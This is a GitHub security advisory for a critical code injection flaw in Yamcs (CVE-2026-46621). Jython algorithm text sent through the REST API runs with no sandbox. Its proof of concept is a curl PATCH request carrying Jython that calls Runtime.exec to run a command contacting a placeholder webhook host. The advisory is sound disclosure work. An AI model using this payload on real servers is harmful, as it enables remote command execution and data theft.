# [C] Yamcs Vulnerable to Authenticated Remote Code Execution (RCE) via Jython Algorithm Code Injection

## Summary
Severity: Critical
Advisory: GHSA-2g95-6x5q-xjwj
CVE: CVE-2026-46621
CWE: CWE-94
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-27
Source: https://github.com/advisories/GHSA-2g95-6x5q-xjwj
Type: github-advisory

## Affected
- Maven: `org.yamcs:yamcs-core` — affected >=0 <5.12.7

## Details
### Summary
A Server-Side Code Injection vulnerability exists in the Yamcs script evaluation engine for Python algorithms. The application dynamically compiles and evaluates user-controlled algorithm text using Jython (via the JSR-223 ScriptEngine API) without enforcing a secure sandbox. An authenticated user with the `ChangeMissionDatabase` privilege can exploit this by overriding the algorithm logic through the REST API, achieving Remote Code Execution (RCE) on the underlying host operating system.

### Details
The vulnerability lies in how Yamcs handles dynamic script evaluation. When a user updates an algorithm via the MDB (Mission Database) API (`/api/mdb/{instance}/realtime/algorithms/{name}`), the `AlgorithmManager` uses the `ScriptAlgorithmExecutorFactory` to instantiate a JSR-223 `ScriptEngine` (in this case, Jython/Python). 

Because Jython allows seamless interoperability with native Java classes, an attacker can import and execute arbitrary Java classes such as `java.lang.Runtime`. Any valid Python algorithm can be overwritten with a malicious payload that executes OS-level commands.

### PoC

**Prerequisites:**
1. A running Yamcs instance with the Jython engine available in its classpath (e.g., `jython-standalone` dependency included).
2. An active authentication token for a user with the `SystemPrivilege.ChangeMissionDatabase` privilege.
3. An existing algorithm defined in the Mission Database (MDB) with its language explicitly set to `python` (e.g., a custom `poc` algorithm). *Note: Yamcs prevents changing the underlying language engine of an algorithm via the API, so an existing Python algorithm must be targeted.*

**Exploitation Steps:**

1. Send an authenticated HTTP PATCH request to the MDB API endpoint to inject the malicious Jython code into the existing Python algorithm. The payload leverages `java.lang.Runtime` to execute an OS command (e.g., triggering an external webhook or a reverse shell).

    ```bash
    curl -i -X PATCH http://<YAMCS-SERVER-IP>:8090/api/mdb/myproject/realtime/algorithms/myproject/poc \
         -H 'Content-Type: application/json' \
         -H 'Authorization: Bearer <YOUR_AUTH_TOKEN>' \
         -d '{
           "action": "SET",
           "algorithm": {
             "text": "import java.lang.Runtime\njava.lang.Runtime.getRuntime().exec([\"bash\", \"-c\", \"curl https://<YOUR-WEBHOOK-URL>/RCE\"])\nout0.value = 1.0"
           }
         }'
    ```

    *(Note: Assigning a valid output like `out0.value = 1.0` ensures the algorithm returns the expected data type to the Yamcs internal processor, preventing crash loops and ensuring clean execution).*

2. Trigger the algorithm evaluation by sending telemetry data that the algorithm depends on (e.g., running the `simulator.py` script to update the required parameters like `Sunsensor`).

3. The Yamcs server compiles the injected text into an executable script on the fly.

4. Verify that the OS command executed successfully on the host machine by checking the incoming HTTP request on the provided webhook URL.

### Impact
It impacts any Yamcs deployment where users are granted the `ChangeMissionDatabase` privilege and a scripting engine (like Jython) is present in the classpath. An attacker can leverage this to escalate application-level configuration privileges to full System/OS control, leading to arbitrary command execution, data exfiltration, and potential lateral movement within the hosting infrastructure.

### Credits
Discovered & reported by Pablo Picurelli Ortiz (@superpegaso2703), cybersecurity student at Universidad Rey Juan Carlos.

## References
- https://github.com/yamcs/yamcs/security/advisories/GHSA-2g95-6x5q-xjwj
- https://github.com/yamcs/yamcs
